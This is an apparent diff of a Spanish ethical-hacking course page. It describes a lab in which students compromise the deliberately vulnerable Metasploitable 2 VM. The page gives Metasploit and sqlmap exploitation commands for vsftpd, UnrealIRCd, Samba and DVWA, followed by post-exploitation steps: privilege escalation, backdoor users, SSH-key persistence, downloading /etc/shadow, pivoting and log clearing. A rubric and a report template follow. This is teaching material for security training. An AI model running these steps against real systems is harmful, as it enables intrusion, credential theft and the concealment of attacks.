 <span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Contraseña: (vacía — solo presionar Enter)</span></span>
@@ -694,8 +885,8 @@ mysql&gt; show databases;
 | tikiwiki195        |
 +--------------------+</code></pre>
 </section>
-<section id="enumeración-de-irc-unrealircd" class="level3" data-number="17.5.5">
-<h3 data-number="17.5.5" class="anchored" data-anchor-id="enumeración-de-irc-unrealircd"><span class="header-section-number">17.5.5</span> 2.5 Enumeración de IRC (UnrealIRCd)</h3>
+<section id="enumeración-de-irc-unrealircd" class="level3">
+<h3 class="anchored" data-anchor-id="enumeración-de-irc-unrealircd">2.5 Enumeración de IRC (UnrealIRCd)</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar versión de UnrealIRCd</span></span>
 <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-nv</span> <span class="va">$TARGET</span> 6667</span>
 <span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Escribir: VERSION</span></span>
@@ -709,14 +900,14 @@ mysql&gt; show databases;
 <hr>
 </section>
 </section>
-<section id="fase-3-explotación" class="level2" data-number="17.6">
-<h2 data-number="17.6" class="anchored" data-anchor-id="fase-3-explotación"><span class="header-section-number">17.6</span> Fase 3: Explotación</h2>
+<section id="fase-3-explotación" class="level2">
+<h2 class="anchored" data-anchor-id="fase-3-explotación">Fase 3: Explotación</h2>
 <p><strong>Objetivo</strong>: Obtener acceso al sistema mediante al menos tres vectores de ataque diferentes.</p>
 <blockquote class="blockquote">
 <p><strong>Importante</strong>: Documentar cada explotación con capturas de pantalla o salida de terminal guardada en archivo.</p>
 </blockquote>
-<section id="vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523" class="level3" data-number="17.6.1">
-<h3 data-number="17.6.1" class="anchored" data-anchor-id="vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523"><span class="header-section-number">17.6.1</span> 3.1 Vector 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
+<section id="vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523" class="level3">
+<h3 class="anchored" data-anchor-id="vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523">3.1 Vector 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
 <p><strong>Descripción</strong>: vsftpd 2.3.4 fue comprometido en su repositorio oficial en 2011. Cuando el usuario de FTP contiene <code>:)</code> (smiley), el daemon abre una shell de root en el puerto 6200.</p>
 <p><strong>CVSS v3</strong>: 9.8 (Crítico) | <strong>CWE</strong>: CWE-78 (OS Command Injection)</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Iniciar Metasploit</span></span>
@@ -755,8 +946,8 @@ metasploitable</code></pre>
 <span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span> <span class="op">&gt;</span> /tmp/vector1_evidencia.txt</span>
 <span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd <span class="op">&gt;&gt;</span> /tmp/vector1_evidencia.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075" class="level3" data-number="17.6.2">
-<h3 data-number="17.6.2" class="anchored" data-anchor-id="vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075"><span class="header-section-number">17.6.2</span> 3.2 Vector 2 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)</h3>
+<section id="vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075" class="level3">
+<h3 class="anchored" data-anchor-id="vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075">3.2 Vector 2 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)</h3>
 <p><strong>Descripción</strong>: UnrealIRCd 3.2.8.1 fue distribuido con una backdoor que permite ejecución de comandos arbitrarios enviando <code>AB</code> seguido del comando al puerto IRC.</p>
 <p><strong>CVSS v2</strong>: 7.5 (Alta) | <strong>CWE</strong>: CWE-78 (OS Command Injection)</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co"># En msfconsole</span></span>
@@ -796,8 +987,8 @@ metasploitable</code></pre>
 id
 uid=1001(ircd) gid=1001(ircd)</code></pre>
 </section>
-<section id="vector-3-samba-3.0.20-username-map-script-cve-2007-2447" class="level3" data-number="17.6.3">
-<h3 data-number="17.6.3" class="anchored" data-anchor-id="vector-3-samba-3.0.20-username-map-script-cve-2007-2447"><span class="header-section-number">17.6.3</span> 3.3 Vector 3 — Samba 3.0.20 “username map script” (CVE-2007-2447)</h3>
+<section id="vector-3-samba-3.0.20-username-map-script-cve-2007-2447" class="level3">
+<h3 class="anchored" data-anchor-id="vector-3-samba-3.0.20-username-map-script-cve-2007-2447">3.3 Vector 3 — Samba 3.0.20 “username map script” (CVE-2007-2447)</h3>
 <p><strong>Descripción</strong>: Samba 3.0.0–3.0.25rc3 permite inyección de comandos en el campo de usuario MS-RPC cuando <code>username map script</code> está configurado. Produce shell de root directamente.</p>
 <p><strong>CVSS v2</strong>: 10.0 (Crítico) | <strong>CWE</strong>: CWE-20 (Improper Input Validation)</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> search samba usermap</span>
@@ -822,8 +1013,8 @@ uid=1001(ircd) gid=1001(ircd)</code></pre>
 id
 uid=0(root) gid=0(root)</code></pre>
 </section>
-<section id="vector-4-bonus-dvwa-sql-injection-file-upload" class="level3" data-number="17.6.4">
-<h3 data-number="17.6.4" class="anchored" data-anchor-id="vector-4-bonus-dvwa-sql-injection-file-upload"><span class="header-section-number">17.6.4</span> 3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload</h3>
+<section id="vector-4-bonus-dvwa-sql-injection-file-upload" class="level3">
+<h3 class="anchored" data-anchor-id="vector-4-bonus-dvwa-sql-injection-file-upload">3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload</h3>
 <p><strong>Descripción</strong>: DVWA (Damn Vulnerable Web Application) expone múltiples vulnerabilidades web. Utilizaremos SQLi para extraer credenciales y File Upload para subir una webshell.</p>
 <p><strong>Pre-requisito</strong>: Abrir <code>http://192.168.56.102/dvwa/</code> en el navegador, iniciar sesión con <code>admin/password</code>, ajustar el nivel de seguridad a “Low”.</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 4a. Extracción de credenciales con SQLmap</span></span>
@@ -861,14 +1052,14 @@ Table: users
 <hr>
 </section>
 </section>
-<section id="fase-4-post-explotación" class="level2" data-number="17.7">
-<h2 data-number="17.7" class="anchored" data-anchor-id="fase-4-post-explotación"><span class="header-section-number">17.7</span> Fase 4: Post-Explotación</h2>
+<section id="fase-4-post-explotación" class="level2">
+<h2 class="anchored" data-anchor-id="fase-4-post-explotación">Fase 4: Post-Explotación</h2>
 <p><strong>Objetivo</strong>: Desde el acceso obtenido, realizar escalada de privilegios, establecer persistencia, moverse lateralmente y simular exfiltración de datos.</p>
 <blockquote class="blockquote">
 <p>Trabajaremos desde la sesión obtenida en el Vector 1 (root) o Vector 2 (ircd). Hacer <code>background</code> de la sesión activa para seguir desde msfconsole.</p>
 </blockquote>
-<section id="reconocimiento-del-sistema-comprometido" class="level3" data-number="17.7.1">
-<h3 data-number="17.7.1" class="anchored" data-anchor-id="reconocimiento-del-sistema-comprometido"><span class="header-section-number">17.7.1</span> 4.1 Reconocimiento del Sistema Comprometido</h3>
+<section id="reconocimiento-del-sistema-comprometido" class="level3">
+<h3 class="anchored" data-anchor-id="reconocimiento-del-sistema-comprometido">4.1 Reconocimiento del Sistema Comprometido</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde shell en el objetivo</span></span>
 <span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Información del sistema</span></span>
 <span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-a</span></span>
@@ -902,8 +1093,8 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 /usr/bin/nmap  &lt;--- SUID en versión antigua = escalada a root
 /usr/bin/sudo</code></pre>
 </section>
-<section id="escalada-de-privilegios-desde-usuario-no-root" class="level3" data-number="17.7.2">
-<h3 data-number="17.7.2" class="anchored" data-anchor-id="escalada-de-privilegios-desde-usuario-no-root"><span class="header-section-number">17.7.2</span> 4.2 Escalada de Privilegios (desde usuario no-root)</h3>
+<section id="escalada-de-privilegios-desde-usuario-no-root" class="level3">
+<h3 class="anchored" data-anchor-id="escalada-de-privilegios-desde-usuario-no-root">4.2 Escalada de Privilegios (desde usuario no-root)</h3>
 <p>Si el acceso obtenido es de usuario limitado (ej: <code>ircd</code>), usar los siguientes métodos:</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: nmap interactivo (versión antigua con --interactive)</span></span>
 <span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--interactive</span></span>
@@ -924,8 +1115,8 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 [+] 192.168.56.102 - exploit/linux/local/udev_netlink: The target appears to be vulnerable.
 [+] 192.168.56.102 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.</code></pre>
 </section>
-<section id="actualizar-shell-a-meterpreter" class="level3" data-number="17.7.3">
-<h3 data-number="17.7.3" class="anchored" data-anchor-id="actualizar-shell-a-meterpreter"><span class="header-section-number">17.7.3</span> 4.3 Actualizar Shell a Meterpreter</h3>
+<section id="actualizar-shell-a-meterpreter" class="level3">
+<h3 class="anchored" data-anchor-id="actualizar-shell-a-meterpreter">4.3 Actualizar Shell a Meterpreter</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde msfconsole, con sesión de shell abierta</span></span>
 <span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-l</span></span>
 <span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -942,8 +1133,8 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getuid</span>
 <span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getpid</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="persistencia" class="level3" data-number="17.7.4">
-<h3 data-number="17.7.4" class="anchored" data-anchor-id="persistencia"><span class="header-section-number">17.7.4</span> 4.4 Persistencia</h3>
+<section id="persistencia" class="level3">
+<h3 class="anchored" data-anchor-id="persistencia">4.4 Persistencia</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb34"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: Agregar usuario backdoor al sistema</span></span>
 <span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
 <span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
@@ -968,8 +1159,8 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <span id="cb34-22"><a href="#cb34-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar acceso persistente</span></span>
 <span id="cb34-23"><a href="#cb34-23" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> ~/.ssh/id_rsa root@192.168.56.102</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="exfiltración-de-datos" class="level3" data-number="17.7.5">
-<h3 data-number="17.7.5" class="anchored" data-anchor-id="exfiltración-de-datos"><span class="header-section-number">17.7.5</span> 4.5 Exfiltración de Datos</h3>
+<section id="exfiltración-de-datos" class="level3">
+<h3 class="anchored" data-anchor-id="exfiltración-de-datos">4.5 Exfiltración de Datos</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Exfiltrar archivos sensibles del objetivo</span></span>
 <span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/passwd /tmp/exfil_passwd.txt</span>
 <span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/shadow /tmp/exfil_shadow.txt</span>
@@ -989,8 +1180,8 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_password'</span> ] <span class="op">=</span> <span class="st">'toor'</span><span class="ot">;</span></span>
 <span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_database'</span> ] <span class="op">=</span> <span class="st">'dvwa'</span><span class="ot">;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="movimiento-lateral-y-pivoting-conceptual" class="level3" data-number="17.7.6">
-<h3 data-number="17.7.6" class="anchored" data-anchor-id="movimiento-lateral-y-pivoting-conceptual"><span class="header-section-number">17.7.6</span> 4.6 Movimiento Lateral y Pivoting (Conceptual)</h3>
+<section id="movimiento-lateral-y-pivoting-conceptual" class="level3">
+<h3 class="anchored" data-anchor-id="movimiento-lateral-y-pivoting-conceptual">4.6 Movimiento Lateral y Pivoting (Conceptual)</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver interfaces de red del objetivo (buscar otras subredes)</span></span>
 <span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> ipconfig</span>
 <span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> route</span>
@@ -1009,8 +1200,8 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Editar /etc/proxychains4.conf: agregar "socks5 127.0.0.1 1080"</span></span>
 <span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a><span class="ex">proxychains</span> nmap <span class="at">-sT</span> <span class="at">-Pn</span> <span class="at">-p</span> 22,80,443 10.0.0.1</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="borrado-de-huellas" class="level3" data-number="17.7.7">
-<h3 data-number="17.7.7" class="anchored" data-anchor-id="borrado-de-huellas"><span class="header-section-number">17.7.7</span> 4.7 Borrado de Huellas</h3>
+<section id="borrado-de-huellas" class="level3">
+<h3 class="anchored" data-anchor-id="borrado-de-huellas">4.7 Borrado de Huellas</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar logs del sistema</span></span>
 <span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> clearev</span>
 <span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -1032,11 +1223,11 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <hr>
 </section>
 </section>
-<section id="fase-5-reporte-profesional" class="level2" data-number="17.8">
-<h2 data-number="17.8" class="anchored" data-anchor-id="fase-5-reporte-profesional"><span class="header-section-number">17.8</span> Fase 5: Reporte Profesional</h2>
+<section id="fase-5-reporte-profesional" class="level2">
+<h2 class="anchored" data-anchor-id="fase-5-reporte-profesional">Fase 5: Reporte Profesional</h2>
 <p><strong>Objetivo</strong>: Documentar todos los hallazgos en un reporte ejecutivo y técnico siguiendo estándares de la industria (PTES, OWASP Testing Guide).</p>
-<section id="estructura-del-reporte" class="level3" data-number="17.8.1">
-<h3 data-number="17.8.1" class="anchored" data-anchor-id="estructura-del-reporte"><span class="header-section-number">17.8.1</span> 5.1 Estructura del Reporte</h3>
+<section id="estructura-del-reporte" class="level3">
+<h3 class="anchored" data-anchor-id="estructura-del-reporte">5.1 Estructura del Reporte</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb39"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Informe de Prueba de Penetración</span></span>
 <span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a>**Cliente**: <span class="co">[</span><span class="ot">Nombre del cliente</span><span class="co">]</span></span>
 <span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a>**Clasificación**: CONFIDENCIAL</span>
@@ -1221,8 +1412,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 <hr>
 </section>
 </section>
-<section id="resultado-esperado" class="level2" data-number="17.9">
-<h2 data-number="17.9" class="anchored" data-anchor-id="resultado-esperado"><span class="header-section-number">17.9</span> Resultado Esperado</h2>
+<section id="resultado-esperado" class="level2">
+<h2 class="anchored" data-anchor-id="resultado-esperado">Resultado Esperado</h2>
 <p>Al completar el lab, el estudiante debe haber obtenido y documentado:</p>
 <ol type="1">
 <li><strong>Shell root</strong> en al menos dos vectores diferentes</li>
@@ -1231,8 +1422,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 <li><strong>Usuario persistente</strong> creado en el sistema objetivo</li>
 <li><strong>Reporte técnico</strong> con al menos 3 findings documentados con CVE y CVSS</li>
 </ol>
-<section id="flags-para-capturar-evidencia" class="level3" data-number="17.9.1">
-<h3 data-number="17.9.1" class="anchored" data-anchor-id="flags-para-capturar-evidencia"><span class="header-section-number">17.9.1</span> Flags para Capturar (Evidencia)</h3>
+<section id="flags-para-capturar-evidencia" class="level3">
+<h3 class="anchored" data-anchor-id="flags-para-capturar-evidencia">Flags para Capturar (Evidencia)</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb41"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 1 — contenido de /etc/shadow (primeras 3 líneas)</span></span>
 <span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-3</span> /etc/shadow</span>
 <span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -1248,8 +1439,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 <span id="cb41-13"><a href="#cb41-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 5 — versión exacta del kernel</span></span>
 <span id="cb41-14"><a href="#cb41-14" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-r</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="capturas-de-pantalla-requeridas" class="level3" data-number="17.9.2">
-<h3 data-number="17.9.2" class="anchored" data-anchor-id="capturas-de-pantalla-requeridas"><span class="header-section-number">17.9.2</span> Capturas de Pantalla Requeridas</h3>
+<section id="capturas-de-pantalla-requeridas" class="level3">
+<h3 class="anchored" data-anchor-id="capturas-de-pantalla-requeridas">Capturas de Pantalla Requeridas</h3>
 <ul class="task-list">
 <li><label><input type="checkbox"><code>screenshot_01_nmap_puertos.png</code> — Output completo de nmap con todos los puertos</label></li>
 <li><label><input type="checkbox"><code>screenshot_02_vector1_root.png</code> — Shell root vía vsftpd</label></li>
@@ -1261,8 +1452,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 <hr>
 </section>
 </section>
-<section id="rúbrica-de-evaluación" class="level2" data-number="17.10">
-<h2 data-number="17.10" class="anchored" data-anchor-id="rúbrica-de-evaluación"><span class="header-section-number">17.10</span> Rúbrica de Evaluación</h2>
+<section id="rúbrica-de-evaluación" class="level2">
+<h2 class="anchored" data-anchor-id="rúbrica-de-evaluación">Rúbrica de Evaluación</h2>
 <table class="caption-top table">
 <colgroup>
 <col style="width: 21%">
@@ -1294,8 +1485,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 </tr>
 </tbody>
 </table>
-<section id="desglose-del-laboratorio-40" class="level3" data-number="17.10.1">
-<h3 data-number="17.10.1" class="anchored" data-anchor-id="desglose-del-laboratorio-40"><span class="header-section-number">17.10.1</span> Desglose del Laboratorio (40%)</h3>
+<section id="desglose-del-laboratorio-40" class="level3">
+<h3 class="anchored" data-anchor-id="desglose-del-laboratorio-40">Desglose del Laboratorio (40%)</h3>
 <table class="caption-top table">
 <thead>
 <tr class="header">
@@ -1335,8 +1526,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 </tbody>
 </table>
 </section>
-<section id="desglose-del-reporte-40" class="level3" data-number="17.10.2">
-<h3 data-number="17.10.2" class="anchored" data-anchor-id="desglose-del-reporte-40"><span class="header-section-number">17.10.2</span> Desglose del Reporte (40%)</h3>
+<section id="desglose-del-reporte-40" class="level3">
+<h3 class="anchored" data-anchor-id="desglose-del-reporte-40">Desglose del Reporte (40%)</h3>
 <table class="caption-top table">
 <thead>
 <tr class="header">
@@ -1374,8 +1565,8 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 <hr>
 </section>
 </section>
-<section id="estructura-de-entregables" class="level2" data-number="17.11">
-<h2 data-number="17.11" class="anchored" data-anchor-id="estructura-de-entregables"><span class="header-section-number">17.11</span> Estructura de Entregables</h2>
+<section id="estructura-de-entregables" class="level2">
+<h2 class="anchored" data-anchor-id="estructura-de-entregables">Estructura de Entregables</h2>
 <p>Crear la carpeta <code>proyecto_final/</code> con la siguiente estructura:</p>
 <pre><code>proyecto_final/
 ├── README.md               # Índice del proyecto
@@ -1408,10 +1599,10 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
     └── reporte_tecnico.md</code></pre>
 <hr>
 </section>
-<section id="recursos" class="level2" data-number="17.12">
-<h2 data-number="17.12" class="anchored" data-anchor-id="recursos"><span class="header-section-number">17.12</span> Recursos</h2>
-<section id="documentación-de-herramientas" class="level3" data-number="17.12.1">
-<h3 data-number="17.12.1" class="anchored" data-anchor-id="documentación-de-herramientas"><span class="header-section-number">17.12.1</span> Documentación de Herramientas</h3>
+<section id="recursos" class="level2">
+<h2 class="anchored" data-anchor-id="recursos">Recursos</h2>
+<section id="documentación-de-herramientas" class="level3">
+<h3 class="anchored" data-anchor-id="documentación-de-herramientas">Documentación de Herramientas</h3>
 <ul>
 <li><a href="https://docs.rapid7.com/metasploit/">Metasploit Framework Docs</a></li>
 <li><a href="https://nmap.org/book/man.html">Nmap Book</a></li>
@@ -1419,32 +1610,32 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 <li><a href="https://github.com/sqlmapproject/sqlmap/wiki">sqlmap Wiki</a></li>
 </ul>
 </section>
-<section id="cves-explotados-en-este-lab" class="level3" data-number="17.12.2">
-<h3 data-number="17.12.2" class="anchored" data-anchor-id="cves-explotados-en-este-lab"><span class="header-section-number">17.12.2</span> CVEs Explotados en este Lab</h3>
+<section id="cves-explotados-en-este-lab" class="level3">
+<h3 class="anchored" data-anchor-id="cves-explotados-en-este-lab">CVEs Explotados en este Lab</h3>
 <ul>
 <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a> — vsftpd 2.3.4 Backdoor</li>
 <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2007-2447">CVE-2007-2447</a> — Samba Username Map Script</li>
 <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075">CVE-2010-2075</a> — UnrealIRCd 3.2.8.1 Backdoor</li>
 </ul>
 </section>
-<section id="metasploitable-2" class="level3" data-number="17.12.3">
-<h3 data-number="17.12.3" class="anchored" data-anchor-id="metasploitable-2"><span class="header-section-number">17.12.3</span> Metasploitable 2</h3>
+<section id="metasploitable-2" class="level3">
+<h3 class="anchored" data-anchor-id="metasploitable-2">Metasploitable 2</h3>
 <ul>
 <li><a href="https://sourceforge.net/projects/metasploitable/">Metasploitable 2 Download (SourceForge)</a></li>
 <li><a href="https://community.rapid7.com/docs/DOC-1875">Metasploitable 2 Exploitability Guide — Rapid7</a></li>
 <li><a href="https://www.vulnhub.com/entry/metasploitable-2,29/">VulnHub — Metasploitable 2 Walkthrough Reference</a></li>
 </ul>
 </section>
-<section id="metodologías-de-pentest" class="level3" data-number="17.12.4">
-<h3 data-number="17.12.4" class="anchored" data-anchor-id="metodologías-de-pentest"><span class="header-section-number">17.12.4</span> Metodologías de Pentest</h3>
+<section id="metodologías-de-pentest" class="level3">
+<h3 class="anchored" data-anchor-id="metodologías-de-pentest">Metodologías de Pentest</h3>
 <ul>
 <li><a href="http://www.pentest-standard.org/">PTES — Penetration Testing Execution Standard</a></li>
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Web Security Testing Guide</a></li>
 <li><a href="https://csrc.nist.gov/publications/detail/sp/800-115/final">NIST SP 800-115 — Technical Guide to Information Security Testing</a></li>
 </ul>
 </section>
-<section id="recursos-de-aprendizaje-adicional" class="level3" data-number="17.12.5">
-<h3 data-number="17.12.5" class="anchored" data-anchor-id="recursos-de-aprendizaje-adicional"><span class="header-section-number">17.12.5</span> Recursos de Aprendizaje Adicional</h3>
+<section id="recursos-de-aprendizaje-adicional" class="level3">
+<h3 class="anchored" data-anchor-id="recursos-de-aprendizaje-adicional">Recursos de Aprendizaje Adicional</h3>
 <ul>
 <li><a href="https://www.hackthebox.com/">Hack The Box</a> — Plataforma de práctica</li>
 <li><a href="https://tryhackme.com/room/metasploitintro">TryHackMe — Metasploit Room</a></li>
@@ -1458,28 +1649,21 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 </section>
 
 </main> <!-- /main -->
-<!-- Sistema de Progreso -->
-<script src="assets/js/progress.js"></script>
-
-<!-- Navegación Móvil -->
-<script src="assets/js/mobile-nav.js"></script>
-
-<!-- Inicialización de componentes UX -->
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Inicializar sistema de progreso
-    if (window.CourseProgress) {
-        console.log('Sistema de progreso inicializado');
-    }
-    
-    // Inicializar navegación móvil
-    if (window.MobileNav) {
-        console.log('Navegación móvil inicializada');
-    }
-});
-</script>
 <script id="quarto-html-after-body" type="application/javascript">
   window.document.addEventListener("DOMContentLoaded", function (event) {
+    // Ensure there is a toggle, if there isn't float one in the top right
+    if (window.document.querySelector('.quarto-color-scheme-toggle') === null) {
+      const a = window.document.createElement('a');
+      a.classList.add('top-right');
+      a.classList.add('quarto-color-scheme-toggle');
+      a.href = "";
+      a.onclick = function() { try { window.quartoToggleColorScheme(); } catch {} return false; };
+      const i = window.document.createElement("i");
+      i.classList.add('bi');
+      a.appendChild(i);
+      window.document.body.appendChild(a);
+    }
+    setColorSchemeToggle(hasAlternateSentinel())
     const icon = "";
     const anchorJS = new window.AnchorJS();
     anchorJS.options = {
@@ -1602,7 +1786,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
       var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
       var mailtoRegex = new RegExp(/^mailto:/);
-        var filterRegex = new RegExp("https:\/\/statick88\.github\.io\/ethical-hacking-2026\/");
